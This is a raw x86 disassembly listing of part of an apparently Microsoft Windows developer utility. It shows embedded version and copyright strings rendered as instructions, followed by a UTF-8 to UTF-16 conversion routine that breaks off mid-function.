  4016d8:	or     al,BYTE PTR [eax]
  4016da:	inc    ebx
  4016db:	add    BYTE PTR [edi+0x0],cl
  4016de:	dec    esi
  4016df:	add    BYTE PTR [eax+eax*1+0x45],dl
  4016e3:	add    BYTE PTR [eax+0x0],bl
  4016e6:	push   esp
  4016e7:	add    BYTE PTR [edx],bh
  4016e9:	add    BYTE PTR [edx],cl
  4016eb:	add    BYTE PTR [eax],ah
  4016ed:	add    BYTE PTR [eax],ah
  4016ef:	add    BYTE PTR [ebp+0x0],al
  4016f2:	popa   
  4016f3:	add    BYTE PTR [eax+0x0],bh
  4016f6:	and    BYTE PTR [eax],al
  4016f8:	and    BYTE PTR [eax],al
  4016fa:	and    BYTE PTR [eax],al
  4016fc:	and    BYTE PTR [eax],al
  4016fe:	cmp    eax,0x25002000
  401703:	add    BYTE PTR [eax+0x0],dh
  401706:	and    BYTE PTR [eax],al
  401708:	and    BYTE PTR [eax],al
  40170a:	inc    ebp
  40170b:	add    BYTE PTR [ebx+0x0],dh
  40170e:	jo     0x401710
  401710:	and    BYTE PTR [eax],al
  401712:	and    BYTE PTR [eax],al
  401714:	and    BYTE PTR [eax],al
  401716:	and    BYTE PTR [eax],al
  401718:	cmp    eax,0x25002000
  40171d:	add    BYTE PTR [eax+0x0],dh
  401720:	or     al,BYTE PTR [eax]
  401722:	and    BYTE PTR [eax],al
  401724:	and    BYTE PTR [eax],al
  401726:	inc    ebp
  401727:	add    BYTE PTR [edx+0x0],ah
  40172a:	js     0x40172c
  40172c:	and    BYTE PTR [eax],al
  40172e:	and    BYTE PTR [eax],al
  401730:	and    BYTE PTR [eax],al
  401732:	and    BYTE PTR [eax],al
  401734:	cmp    eax,0x25002000
  401739:	add    BYTE PTR [eax+0x0],dh
  40173c:	and    BYTE PTR [eax],al
  40173e:	and    BYTE PTR [eax],al
  401740:	inc    ebp
  401741:	add    BYTE PTR [edx+0x0],ah
  401744:	jo     0x401746
  401746:	and    BYTE PTR [eax],al
  401748:	and    BYTE PTR [eax],al
  40174a:	and    BYTE PTR [eax],al
  40174c:	and    BYTE PTR [eax],al
  40174e:	cmp    eax,0x25002000
  401753:	add    BYTE PTR [eax+0x0],dh
  401756:	or     al,BYTE PTR [eax]
  401758:	and    BYTE PTR [eax],al
  40175a:	and    BYTE PTR [eax],al
  40175c:	inc    ebp
  40175d:	add    BYTE PTR [ebx+0x0],ah
  401760:	js     0x401762
  401762:	and    BYTE PTR [eax],al
  401764:	and    BYTE PTR [eax],al
  401766:	and    BYTE PTR [eax],al
  401768:	and    BYTE PTR [eax],al
  40176a:	cmp    eax,0x25002000
  40176f:	add    BYTE PTR [eax+0x0],dh
  401772:	and    BYTE PTR [eax],al
  401774:	and    BYTE PTR [eax],al
  401776:	inc    ebp
  401777:	add    BYTE PTR [ebx+0x0],dh
  40177a:	imul   eax,DWORD PTR [eax],0x200020
  401780:	and    BYTE PTR [eax],al
  401782:	and    BYTE PTR [eax],al
  401784:	cmp    eax,0x25002000
  401789:	add    BYTE PTR [eax+0x0],dh
  40178c:	or     al,BYTE PTR [eax]
  40178e:	and    BYTE PTR [eax],al
  401790:	and    BYTE PTR [eax],al
  401792:	inc    ebp
  401793:	add    BYTE PTR [eax+eax*1+0x78],ah
  401797:	add    BYTE PTR [eax],ah
  401799:	add    BYTE PTR [eax],ah
  40179b:	add    BYTE PTR [eax],ah
  40179d:	add    BYTE PTR [eax],ah
  40179f:	add    BYTE PTR ds:0x25002000,bh
  4017a5:	add    BYTE PTR [eax+0x0],dh
  4017a8:	and    BYTE PTR [eax],al
  4017aa:	and    BYTE PTR [eax],al
  4017ac:	inc    ebp
  4017ad:	add    BYTE PTR [eax+eax*1+0x69],ah
  4017b1:	add    BYTE PTR [eax],ah
  4017b3:	add    BYTE PTR [eax],ah
  4017b5:	add    BYTE PTR [eax],ah
  4017b7:	add    BYTE PTR [eax],ah
  4017b9:	add    BYTE PTR ds:0x25002000,bh
  4017bf:	add    BYTE PTR [eax+0x0],dh
  4017c2:	or     al,BYTE PTR [eax]
  4017c4:	and    BYTE PTR [eax],al
  4017c6:	and    BYTE PTR [eax],al
  4017c8:	inc    ebp
  4017c9:	add    BYTE PTR [ecx+0x0],ch
  4017cc:	jo     0x4017ce
  4017ce:	and    BYTE PTR [eax],al
  4017d0:	and    BYTE PTR [eax],al
  4017d2:	and    BYTE PTR [eax],al
  4017d4:	and    BYTE PTR [eax],al
  4017d6:	cmp    eax,0x25002000
  4017db:	add    BYTE PTR [eax+0x0],dh
  4017de:	and    BYTE PTR [eax],al
  4017e0:	and    BYTE PTR [eax],al
  4017e2:	inc    ebp
  4017e3:	add    BYTE PTR [esi+0x0],al
  4017e6:	ins    BYTE PTR es:[edi],dx
  4017e7:	add    BYTE PTR [ecx+0x0],ah
  4017ea:	add    BYTE PTR [bp+di+0x0],dh
  4017ee:	and    BYTE PTR [eax],al
  4017f0:	cmp    eax,0x25002000
  4017f5:	add    BYTE PTR [eax+0x0],dh
  4017f8:	or     al,BYTE PTR [eax]
  4017fa:	and    BYTE PTR [eax],al
  4017fc:	and    BYTE PTR [eax],al
  4017fe:	push   ebx
  4017ff:	add    BYTE PTR [ebp+0x0],ah
  401802:	add    BYTE PTR [bp+di+0x0],al
  401806:	jae    0x401808
  401808:	and    BYTE PTR [eax],al
  40180a:	and    BYTE PTR [eax],al
  40180c:	cmp    eax,0x25002000
  401811:	add    BYTE PTR [eax+0x0],dh
  401814:	and    BYTE PTR [eax],al
  401816:	and    BYTE PTR [eax],al
  401818:	push   ebx
  401819:	add    BYTE PTR [ebp+0x0],ah
  40181c:	add    BYTE PTR [si+0x0],al
  401820:	jae    0x401822
  401822:	and    BYTE PTR [eax],al
  401824:	and    BYTE PTR [eax],al
  401826:	cmp    eax,0x25002000
  40182b:	add    BYTE PTR [eax+0x0],dh
  40182e:	or     al,BYTE PTR [eax]
  401830:	and    BYTE PTR [eax],al
  401832:	and    BYTE PTR [eax],al
  401834:	push   ebx
  401835:	add    BYTE PTR [ebp+0x0],ah
  401838:	add    BYTE PTR [bp+di+0x0],dl
  40183c:	jae    0x40183e
  40183e:	and    BYTE PTR [eax],al
  401840:	and    BYTE PTR [eax],al
  401842:	cmp    eax,0x25002000
  401847:	add    BYTE PTR [eax+0x0],dh
  40184a:	and    BYTE PTR [eax],al
  40184c:	and    BYTE PTR [eax],al
  40184e:	push   ebx
  40184f:	add    BYTE PTR [ebp+0x0],ah
  401852:	add    BYTE PTR [di+0x0],al
  401856:	jae    0x401858
  401858:	and    BYTE PTR [eax],al
  40185a:	and    BYTE PTR [eax],al
  40185c:	cmp    eax,0x25002000
  401861:	add    BYTE PTR [eax+0x0],dh
  401864:	or     al,BYTE PTR [eax]
  401866:	and    BYTE PTR [eax],al
  401868:	and    BYTE PTR [eax],al
  40186a:	push   ebx
  40186b:	add    BYTE PTR [ebp+0x0],ah
  40186e:	add    BYTE PTR [bp+0x0],al
  401872:	jae    0x401874
  401874:	and    BYTE PTR [eax],al
  401876:	and    BYTE PTR [eax],al
  401878:	cmp    eax,0x25002000
  40187d:	add    BYTE PTR [eax+0x0],dh
  401880:	and    BYTE PTR [eax],al
  401882:	and    BYTE PTR [eax],al
  401884:	push   ebx
  401885:	add    BYTE PTR [ebp+0x0],ah
  401888:	add    BYTE PTR [bx+0x0],al
  40188c:	jae    0x40188e
  40188e:	and    BYTE PTR [eax],al
  401890:	and    BYTE PTR [eax],al
  401892:	cmp    eax,0x25002000
  401897:	add    BYTE PTR [eax+0x0],dh
  40189a:	or     al,BYTE PTR [eax]
  40189c:	and    BYTE PTR [eax],al
  40189e:	and    BYTE PTR [eax],al
  4018a0:	inc    esp
  4018a1:	add    BYTE PTR [edx+0x0],dh
  4018a4:	xor    BYTE PTR [eax],al
  4018a6:	and    BYTE PTR [eax],al
  4018a8:	and    BYTE PTR [eax],al
  4018aa:	and    BYTE PTR [eax],al
  4018ac:	and    BYTE PTR [eax],al
  4018ae:	cmp    eax,0x25002000
  4018b3:	add    BYTE PTR [eax+0x0],dh
  4018b6:	and    BYTE PTR [eax],al
  4018b8:	and    BYTE PTR [eax],al
  4018ba:	inc    esp
  4018bb:	add    BYTE PTR [edx+0x0],dh
  4018be:	xor    eax,DWORD PTR [eax]
  4018c0:	and    BYTE PTR [eax],al
  4018c2:	and    BYTE PTR [eax],al
  4018c4:	and    BYTE PTR [eax],al
  4018c6:	and    BYTE PTR [eax],al
  4018c8:	cmp    eax,0x25002000
  4018cd:	add    BYTE PTR [eax+0x0],dh
  4018d0:	or     al,BYTE PTR [eax]
  4018d2:	and    BYTE PTR [eax],al
  4018d4:	and    BYTE PTR [eax],al
  4018d6:	inc    esp
  4018d7:	add    BYTE PTR [edx+0x0],dh
  4018da:	xor    DWORD PTR [eax],eax
  4018dc:	and    BYTE PTR [eax],al
  4018de:	and    BYTE PTR [eax],al
  4018e0:	and    BYTE PTR [eax],al
  4018e2:	and    BYTE PTR [eax],al
  4018e4:	cmp    eax,0x25002000
  4018e9:	add    BYTE PTR [eax+0x0],dh
  4018ec:	and    BYTE PTR [eax],al
  4018ee:	and    BYTE PTR [eax],al
  4018f0:	inc    esp
  4018f1:	add    BYTE PTR [edx+0x0],dh
  4018f4:	add    BYTE PTR ss:[eax],ah
  4018f7:	add    BYTE PTR [eax],ah
  4018f9:	add    BYTE PTR [eax],ah
  4018fb:	add    BYTE PTR [eax],ah
  4018fd:	add    BYTE PTR ds:0x25002000,bh
  401903:	add    BYTE PTR [eax+0x0],dh
  401906:	or     al,BYTE PTR [eax]
  401908:	and    BYTE PTR [eax],al
  40190a:	and    BYTE PTR [eax],al
  40190c:	inc    esp
  40190d:	add    BYTE PTR [edx+0x0],dh
  401910:	xor    al,BYTE PTR [eax]
  401912:	and    BYTE PTR [eax],al
  401914:	and    BYTE PTR [eax],al
  401916:	and    BYTE PTR [eax],al
  401918:	and    BYTE PTR [eax],al
  40191a:	cmp    eax,0x25002000
  40191f:	add    BYTE PTR [eax+0x0],dh
  401922:	and    BYTE PTR [eax],al
  401924:	and    BYTE PTR [eax],al
  401926:	inc    esp
  401927:	add    BYTE PTR [edx+0x0],dh
  40192a:	aaa    
  40192b:	add    BYTE PTR [eax],ah
  40192d:	add    BYTE PTR [eax],ah
  40192f:	add    BYTE PTR [eax],ah
  401931:	add    BYTE PTR [eax],ah
  401933:	add    BYTE PTR ds:0x25002000,bh
  401939:	add    BYTE PTR [eax+0x0],dh
  40193c:	or     al,BYTE PTR [eax]
  40193e:	add    BYTE PTR [eax],al
  401940:	push   eax
  401941:	add    BYTE PTR [edx+0x0],dh
  401944:	outs   dx,DWORD PTR ds:[esi]
  401945:	add    BYTE PTR [ebx+0x0],ah
  401948:	add    BYTE PTR gs:[ebx+0x0],dh
  40194c:	jae    0x40194e
  40194e:	imul   eax,DWORD PTR [eax],0x67006e
  401954:	cmp    al,BYTE PTR [eax]
  401956:	and    BYTE PTR [eax],al
  401958:	and    eax,0x20007300
  40195d:	add    BYTE PTR [esi],ch
  40195f:	add    BYTE PTR [esi],ch
  401961:	add    BYTE PTR [edx],cl
  401963:	add    BYTE PTR [eax],al
  401965:	add    BYTE PTR [eax],al
  401967:	add    BYTE PTR ds:0x7300,ah
  40196d:	add    BYTE PTR [eax],al
  40196f:	add    BYTE PTR [eax],ah
  401971:	add    BYTE PTR [esi+0x0],dl
  401974:	add    BYTE PTR gs:[edx+0x0],dh
  401978:	jae    0x40197a
  40197a:	imul   eax,DWORD PTR [eax],0x6e006f
  401980:	and    BYTE PTR [eax],al
  401982:	xor    DWORD PTR [eax],eax
  401984:	xor    DWORD PTR [eax],eax
  401986:	add    BYTE PTR cs:[eax],dh
  401989:	add    BYTE PTR [eax],dh
  40198b:	add    BYTE PTR [esi],ch
  40198d:	add    BYTE PTR ds:0x37003000,dh
  401993:	add    BYTE PTR [edx],dh
  401995:	add    BYTE PTR [edi],dh
	...
  40199f:	add    BYTE PTR [edx],cl
  4019a1:	add    BYTE PTR [ebx+0x0],al
  4019a4:	outs   dx,DWORD PTR ds:[esi]
  4019a5:	add    BYTE PTR [eax+0x0],dh
  4019a8:	jns    0x4019aa
  4019aa:	jb     0x4019ac
  4019ac:	imul   eax,DWORD PTR [eax],0x680067
  4019b2:	je     0x4019b4
  4019b4:	and    BYTE PTR [eax],al
  4019b6:	sub    BYTE PTR [eax],al
  4019b8:	inc    ebx
  4019b9:	add    BYTE PTR [ecx],ch
  4019bb:	add    BYTE PTR [eax],ah
  4019bd:	add    BYTE PTR [ebp+0x0],cl
  4019c0:	imul   eax,DWORD PTR [eax],0x720063
  4019c6:	outs   dx,DWORD PTR ds:[esi]
  4019c7:	add    BYTE PTR [ebx+0x0],dh
  4019ca:	outs   dx,DWORD PTR ds:[esi]
  4019cb:	add    BYTE PTR [esi+0x0],ah
  4019ce:	je     0x4019d0
  4019d0:	and    BYTE PTR [eax],al
  4019d2:	inc    ebx
  4019d3:	add    BYTE PTR [edi+0x0],ch
  4019d6:	jb     0x4019d8
  4019d8:	jo     0x4019da
  4019da:	outs   dx,DWORD PTR ds:[esi]
  4019db:	add    BYTE PTR [edx+0x0],dh
  4019de:	popa   
  4019df:	add    BYTE PTR [eax+eax*1+0x69],dh
  4019e3:	add    BYTE PTR [edi+0x0],ch
  4019e6:	outs   dx,BYTE PTR ds:[esi]
  4019e7:	add    BYTE PTR [esi],ch
  4019e9:	add    BYTE PTR [eax],ah
  4019eb:	add    BYTE PTR [ecx+0x0],al
  4019ee:	ins    BYTE PTR es:[edi],dx
  4019ef:	add    BYTE PTR [eax+eax*1+0x20],ch
  4019f3:	add    BYTE PTR [edx+0x0],dh
  4019f6:	imul   eax,DWORD PTR [eax],0x680067
  4019fc:	je     0x4019fe
  4019fe:	jae    0x401a00
  401a00:	and    BYTE PTR [eax],al
  401a02:	jb     0x401a04
  401a04:	add    BYTE PTR gs:[ebx+0x0],dh
  401a08:	add    BYTE PTR gs:[edx+0x0],dh
  401a0c:	jbe    0x401a0e
  401a0e:	add    BYTE PTR gs:[eax+eax*1+0x2e],ah
  401a13:	add    BYTE PTR [edx],cl
  401a15:	add    BYTE PTR [edx],cl
  401a17:	add    BYTE PTR [eax],al
  401a19:	add    BYTE PTR [eax],al
  401a1b:	add    BYTE PTR ds:0xa007300,ah
  401a21:	add    BYTE PTR [edx],cl
  401a23:	add    BYTE PTR [eax],al
  401a25:	add    BYTE PTR [eax],al
  401a27:	add    BYTE PTR ds:0xa007300,ah
  401a2d:	add    BYTE PTR [eax],al
  401a2f:	add    BYTE PTR [edx+0x0],dh
  401a32:	je     0x401a34
  401a34:	sub    al,0x0
  401a36:	arpl   WORD PTR [eax],ax
  401a38:	arpl   WORD PTR [eax],ax
  401a3a:	jae    0x401a3c
  401a3c:	cmp    eax,0x6e007500
  401a41:	add    BYTE PTR [ecx+0x0],ch
  401a44:	arpl   WORD PTR [eax],ax
  401a46:	outs   dx,DWORD PTR ds:[esi]
  401a47:	add    BYTE PTR [eax+eax*1+0x65],ah
  401a4b:	add    BYTE PTR [eax],al
  401a4d:	add    BYTE PTR [eax],al
  401a4f:	add    BYTE PTR [edx+0x0],ah
  401a52:	jae    0x401a54
  401a54:	arpl   WORD PTR [eax],ax
  401a56:	add    BYTE PTR [eax],al
  401a58:	sub    eax,0x20005300
  401a5d:	add    BYTE PTR [eax],ch
  401a5f:	add    BYTE PTR [esi],ch
  401a61:	add    BYTE PTR [esi],ch
  401a63:	add    BYTE PTR [esi],ch
  401a65:	add    BYTE PTR [eax],al
  401a67:	add    BYTE PTR ds:0x72004500,ch
  401a6d:	add    BYTE PTR [eax],al
  401a6f:	add    BYTE PTR ds:0x72004500,ch
  401a75:	add    BYTE PTR [eax],ah
  401a77:	add    BYTE PTR [eax],ch
  401a79:	add    BYTE PTR [esi],ch
  401a7b:	add    BYTE PTR [esi],ch
  401a7d:	add    BYTE PTR [esi],ch
  401a7f:	add    BYTE PTR [eax],al
  401a81:	add    BYTE PTR [eax],al
  401a83:	add    BYTE PTR ds:0x69004500,ch
  401a89:	add    BYTE PTR [eax],al
  401a8b:	add    BYTE PTR ds:0x69004500,ch
  401a91:	add    BYTE PTR [eax],ah
  401a93:	add    BYTE PTR [eax],ch
  401a95:	add    BYTE PTR [esi],ch
  401a97:	add    BYTE PTR [esi],ch
  401a99:	add    BYTE PTR [esi],ch
  401a9b:	add    BYTE PTR [eax],al
  401a9d:	add    BYTE PTR [eax],al
  401a9f:	add    BYTE PTR [eax+eax*1+0x0],bl
  401aa3:	add    BYTE PTR [esi+0x0],dl
  401aa6:	push   ebx
  401aa7:	add    BYTE PTR [eax+eax*1+0x41],cl
  401aab:	add    BYTE PTR [esi+0x0],cl
  401aae:	inc    edi
  401aaf:	add    BYTE PTR [eax],al
  401ab1:	add    BYTE PTR [eax],al
  401ab3:	add    BYTE PTR [esi+0x0],dl
  401ab6:	push   ebx
  401ab7:	add    BYTE PTR [edi+0x0],bl
  401aba:	push   ebp
  401abb:	add    BYTE PTR [esi+0x0],cl
  401abe:	dec    ecx
  401abf:	add    BYTE PTR [ebx+0x0],al
  401ac2:	dec    edi
  401ac3:	add    BYTE PTR [eax+eax*1+0x45],al
  401ac7:	add    BYTE PTR [edi+0x0],bl
  401aca:	dec    edi
  401acb:	add    BYTE PTR [ebp+0x0],dl
  401ace:	push   esp
  401acf:	add    BYTE PTR [eax+0x0],dl
  401ad2:	push   ebp
  401ad3:	add    BYTE PTR [eax+eax*1+0x0],dl
  401ad7:	add    BYTE PTR [ecx],dh
  401ad9:	add    BYTE PTR [eax],dh
  401adb:	add    BYTE PTR [ebx],dh
  401add:	add    BYTE PTR [ebx],dh
  401adf:	add    BYTE PTR [eax],al
  401ae1:	add    BYTE PTR [eax],al
  401ae3:	add    BYTE PTR [edx],ch
  401ae5:	add    BYTE PTR [eax],al
  401ae7:	add    BYTE PTR [esi],ch
  401ae9:	add    BYTE PTR [esi],ch
  401aeb:	add    BYTE PTR [eax],al
  401aed:	add    BYTE PTR [eax],al
  401aef:	add    BYTE PTR ds:0x75006800,ah
  401af5:	add    BYTE PTR ds:0x6300,ah
  401afb:	add    BYTE PTR [ebp+0x0],dl
  401afe:	dec    ecx
  401aff:	add    BYTE PTR [esi],ch
  401b01:	add    BYTE PTR [eax+eax*1+0x4c],al
  401b05:	add    BYTE PTR [eax+eax*1+0x0],cl
  401b09:	add    BYTE PTR [eax],al
  401b0b:	add    BYTE PTR [eax],al
  401b0d:	add    BYTE PTR [eax],al
  401b0f:	add    BYTE PTR [ebp+0x0],cl
  401b12:	imul   eax,DWORD PTR [eax],0x720063
  401b18:	outs   dx,DWORD PTR ds:[esi]
  401b19:	add    BYTE PTR [ebx+0x0],dh
  401b1c:	outs   dx,DWORD PTR ds:[esi]
  401b1d:	add    BYTE PTR [esi+0x0],ah
  401b20:	je     0x401b22
  401b22:	scas   al,BYTE PTR es:[edi]
  401b23:	add    BYTE PTR [eax],ah
  401b25:	add    BYTE PTR [edx+0x0],al
  401b28:	jb     0x401b2a
  401b2a:	outs   dx,DWORD PTR ds:[esi]
  401b2b:	add    BYTE PTR [edi+0x0],dh
  401b2e:	jae    0x401b30
  401b30:	add    BYTE PTR gs:[eax],ah
  401b33:	add    BYTE PTR [ecx+0x0],cl
  401b36:	outs   dx,BYTE PTR ds:[esi]
  401b37:	add    BYTE PTR [esi+0x0],ah
  401b3a:	outs   dx,DWORD PTR ds:[esi]
  401b3b:	add    BYTE PTR [edx+0x0],dh
  401b3e:	ins    DWORD PTR es:[edi],dx
  401b3f:	add    BYTE PTR [ecx+0x0],ah
  401b42:	je     0x401b44
  401b44:	imul   eax,DWORD PTR [eax],0x6e006f
  401b4a:	and    BYTE PTR [eax],al
  401b4c:	dec    ebp
  401b4d:	add    BYTE PTR [ecx+0x0],ah
  401b50:	imul   eax,DWORD PTR [eax],0x74006e
  401b56:	add    BYTE PTR gs:[esi+0x0],ch
  401b5a:	popa   
  401b5b:	add    BYTE PTR [esi+0x0],ch
  401b5e:	arpl   WORD PTR [eax],ax
  401b60:	add    BYTE PTR gs:[eax],ah
  401b63:	add    BYTE PTR [ebp+0x0],dl
  401b66:	je     0x401b68
  401b68:	imul   eax,DWORD PTR [eax],0x69006c
  401b6e:	je     0x401b70
  401b70:	jns    0x401b72
  401b72:	add    BYTE PTR [eax],al
  401b74:	ins    DWORD PTR es:[edi],dx
  401b75:	add    BYTE PTR [ebx+0x0],dh
  401b78:	jbe    0x401b7a
  401b7a:	arpl   WORD PTR [eax],ax
  401b7c:	jb     0x401b7e
  401b7e:	xor    DWORD PTR [eax],eax
  401b80:	xor    DWORD PTR [eax],eax
  401b82:	xor    BYTE PTR [eax],al
  401b84:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401b89:	add    BYTE PTR [eax+eax*1+0x0],ch
  401b8d:	add    BYTE PTR [ebp+0x0],ch
  401b90:	jae    0x401b92
  401b92:	jo     0x401b94
  401b94:	add    BYTE PTR fs:[edx+0x0],ah
  401b98:	xor    DWORD PTR [eax],eax
  401b9a:	xor    DWORD PTR [eax],eax
  401b9c:	xor    BYTE PTR [eax],al
  401b9e:	add    BYTE PTR cs:[eax+eax*1+0x6c],ah
  401ba3:	add    BYTE PTR [eax+eax*1+0x0],ch
  401ba7:	add    BYTE PTR [eax],al
  401ba9:	add    BYTE PTR [eax],al
  401bab:	add    BYTE PTR [edi],ch
  401bad:	add    BYTE PTR [eax],al
  401baf:	add    BYTE PTR [esi],ch
  401bb1:	add    BYTE PTR [esi],ch
  401bb3:	add    BYTE PTR [eax+eax*1+0x0],bl
  401bb7:	add    BYTE PTR [edx],bh
  401bb9:	add    BYTE PTR [esi],ch
  401bbb:	add    BYTE PTR [edi],ch
  401bbd:	add    BYTE PTR [eax+eax*1+0x0],bl
  401bc1:	add    BYTE PTR [eax],al
  401bc3:	add    BYTE PTR [edi],ch
  401bc5:	add    BYTE PTR [edx+0x0],ah
  401bc8:	jae    0x401bca
  401bca:	arpl   WORD PTR [eax],ax
  401bcc:	das    
  401bcd:	add    BYTE PTR [ebp+0x0],ch
  401bd0:	outs   dx,DWORD PTR ds:[esi]
  401bd1:	add    BYTE PTR [eax+eax*1+0x75],ah
  401bd5:	add    BYTE PTR [eax+eax*1+0x65],ch
  401bd9:	add    BYTE PTR [ebx+0x0],dh
  401bdc:	add    BYTE PTR [eax],al
  401bde:	add    BYTE PTR [eax],al
  401be0:	das    
  401be1:	add    BYTE PTR [edx+0x0],ah
  401be4:	jae    0x401be6
  401be6:	arpl   WORD PTR [eax],ax
  401be8:	das    
  401be9:	add    BYTE PTR [ebx+0x0],dh
  401bec:	bound  eax,QWORD PTR [eax]
  401bee:	jb     0x401bf0
  401bf0:	imul   eax,DWORD PTR [eax],0x66006e
  401bf6:	outs   dx,DWORD PTR ds:[esi]
  401bf7:	add    BYTE PTR [eax],al
  401bf9:	add    BYTE PTR [eax],al
  401bfb:	add    BYTE PTR [eax+0x300040c8],dh
  401c01:	leave  
  401c02:	inc    eax
  401c03:	add    BYTE PTR [eax],al
  401c05:	add    BYTE PTR [eax],al
  401c07:	add    BYTE PTR [eax+0x0],cl
	...
  401c42:	add    BYTE PTR [eax],al
  401c44:	sbb    al,ah
  401c46:	inc    eax
  401c47:	add    BYTE PTR [eax+0x100401c],dl
  401c4d:	add    BYTE PTR [eax],al
  401c4f:	add    BYTE PTR [edx+0x53],dl
  401c52:	inc    esp
  401c53:	push   ebx
  401c54:	dec    ebp
  401c55:	cli    
  401c56:	lea    esp,[ebp+0x4337b85c]
  401c5c:	mov    eax,0xd0ac1eca
  401c61:	cs es pop esp
  401c64:	add    al,0x0
  401c66:	add    BYTE PTR [eax],al
  401c68:	bound  esi,QWORD PTR [ebx+0x63]
  401c6b:	ins    DWORD PTR es:[edi],dx
  401c6c:	popa   
  401c6d:	imul   esp,DWORD PTR [ebp+0x2e],0x70
  401c71:	bound  eax,QWORD PTR fs:[eax]
	...
  401c90:	leave  
  401c91:	fiadd  DWORD PTR [eax]
	...
  401caf:	add    BYTE PTR [ebp-0x75],dl
  401cb2:	in     al,dx
  401cb3:	sub    esp,0x8
  401cb6:	push   ebx
  401cb7:	push   esi
  401cb8:	mov    eax,edx
  401cba:	xor    edx,edx
  401cbc:	xor    esi,esi
  401cbe:	xor    ebx,ebx
  401cc0:	push   edi
  401cc1:	mov    edi,DWORD PTR [ebp+0xc]
  401cc4:	mov    DWORD PTR [ebp-0x4],ecx
  401cc7:	test   eax,eax
  401cc9:	je     0x401de0
  401ccf:	nop
  401cd0:	dec    eax
  401cd1:	mov    DWORD PTR [ebp-0x8],eax
  401cd4:	test   edi,edi
  401cd6:	je     0x401ce0
  401cd8:	cmp    esi,edi
  401cda:	jae    0x401de1
  401ce0:	mov    al,BYTE PTR [ecx]
  401ce2:	test   al,al
  401ce4:	js     0x401cfe
  401ce6:	test   edi,edi
  401ce8:	je     0x401cf6
  401cea:	mov    ecx,DWORD PTR [ebp+0x8]
  401ced:	cbw    
  401cef:	mov    WORD PTR [ecx+esi*2],ax
  401cf3:	mov    ecx,DWORD PTR [ebp-0x4]
  401cf6:	xor    ebx,ebx
  401cf8:	inc    esi
  401cf9:	jmp    0x401dd1
  401cfe:	test   al,0x40
  401d00:	jne    0x401d95
  401d06:	test   edx,edx
  401d08:	je     0x401d91
  401d0e:	dec    edx
  401d0f:	test   ebx,ebx
  401d11:	je     0x401d64
  401d13:	mov    ecx,DWORD PTR [ebp+0xc]
  401d16:	movsx  eax,al
  401d19:	and    eax,0x3f
  401d1c:	shl    ecx,0x6
  401d1f:	or     ecx,eax
  401d21:	mov    DWORD PTR [ebp+0xc],ecx
  401d24:	test   edx,edx
  401d26:	jne    0x401dce
  401d2c:	test   edi,edi
  401d2e:	je     0x401d5d
  401d30:	lea    eax,[edi-0x1]
  401d33:	cmp    esi,eax
  401d35:	jae    0x401d5d
  401d37:	mov    ebx,DWORD PTR [ebp+0x8]
  401d3a:	lea    eax,[ecx-0x10000]
  401d40:	shr    eax,0xa
  401d43:	sub    eax,0x2800
  401d48:	mov    WORD PTR [ebx+esi*2],ax
  401d4c:	mov    eax,ecx
  401d4e:	and    eax,0x3ff
  401d53:	sub    eax,0x2400
  401d58:	mov    WORD PTR [ebx+esi*2+0x2],ax
  401d5d:	add    esi,0x2
  401d60:	xor    ebx,ebx
  401d62:	jmp    0x401dce
  401d64:	test   edi,edi
  401d66:	je     0x401d8a
  401d68:	mov    eax,DWORD PTR [ebp+0x8]
  401d6b:	shl    WORD PTR [eax+esi*2],0x6
  401d70:	movzx  ecx,WORD PTR [eax+esi*2]
  401d74:	mov    eax,DWORD PTR [ebp-0x4]
  401d77:	mov    al,BYTE PTR [eax]
  401d79:	and    al,0x3f
  401d7b:	cbw    
  401d7d:	or     ax,cx
  401d80:	mov    ecx,DWORD PTR [ebp+0x8]
  401d83:	mov    WORD PTR [ecx+esi*2],ax
  401d87:	mov    ecx,DWORD PTR [ebp-0x4]
  401d8a:	test   edx,edx
  401d8c:	jne    0x401dd1
  401d8e:	inc    esi
  401d8f:	jmp    0x401dd1
  401d91:	xor    ebx,ebx
  401d93:	jmp    0x401dd1
  401d95:	test   edx,edx
  401d97:	jle    0x401da0
  401d99:	xor    edx,edx
  401d9b:	xor    ebx,ebx
  401d9d:	inc    esi
  401d9e:	jmp    0x401dd1
  401da0:	test   al,al
  401da2:	jns    0x401da9
  401da4:	inc    edx
  401da5:	add    al,al
  401da7:	js     0x401da4
  401da9:	cmp    edx,0x4
  401dac:	jne    0x401dbc
  401dae:	mov    cl,al
  401db0:	sar    cl,0x4
  401db3:	movsx  ecx,cl
  401db6:	mov    DWORD PTR [ebp+0xc],ecx
  401db9:	lea    ebx,[edx-0x3]
  401dbc:	test   edi,edi
  401dbe:	je     0x401dcd
  401dc0:	mov    cl,dl
  401dc2:	sar    al,cl
  401dc4:	mov    ecx,DWORD PTR [ebp+0x8]
  401dc7:	cbw    
  401dc9:	mov    WORD PTR [ecx+esi*2],ax
  401dcd:	dec    edx
  401dce:	mov    ecx,DWORD PTR [ebp-0x4]
  401dd1:	mov    eax,DWORD PTR [ebp-0x8]
  401dd4:	inc    ecx
  401dd5:	mov    DWORD PTR [ebp-0x4],ecx
  401dd8:	test   eax,eax
  401dda:	jne    0x401cd0
  401de0:	dec    eax
  401de1:	test   edi,edi
  401de3:	je     0x401dfb
  401de5:	cmp    eax,0xffffffff
  401de8:	je     0x401dfb
  401dea:	push   0x7a
  401dec:	call   DWORD PTR ds:0x4242b0
  401df2:	pop    edi
  401df3:	pop    esi
  401df4:	xor    eax,eax
  401df6:	pop    ebx
  401df7:	mov    esp,ebp
  401df9:	pop    ebp
  401dfa:	ret    
  401dfb:	pop    edi
  401dfc:	mov    eax,esi
  401dfe:	pop    esi
  401dff:	pop    ebx
  401e00:	mov    esp,ebp
  401e02:	pop    ebp
  401e03:	ret    
  401e04:	int3   
  401e05:	int3   
  401e06:	int3   
  401e07:	int3   
  401e08:	int3   
  401e09:	int3   
  401e0a:	int3   
  401e0b:	int3   
  401e0c:	int3   
  401e0d:	int3   
  401e0e:	int3   
  401e0f:	int3   
  401e10:	push   ebp
  401e11:	mov    ebp,esp
  401e13:	sub    esp,0x20
  401e16:	push   ebx
  401e17:	mov    ebx,DWORD PTR [ebp+0xc]
  401e1a:	mov    DWORD PTR [ebp-0x4],edx
  401e1d:	mov    DWORD PTR [ebp-0x8],ecx
  401e20:	mov    ecx,DWORD PTR [ebp-0x4]
  401e23:	push   esi
  401e24:	xor    eax,eax
  401e26:	xor    edx,edx
  401e28:	push   edi
  401e29:	test   ecx,ecx
  401e2b:	je     0x40207e
  401e31:	lea    esi,[eax+0x2]
  401e34:	lea    edi,[eax+0x1]
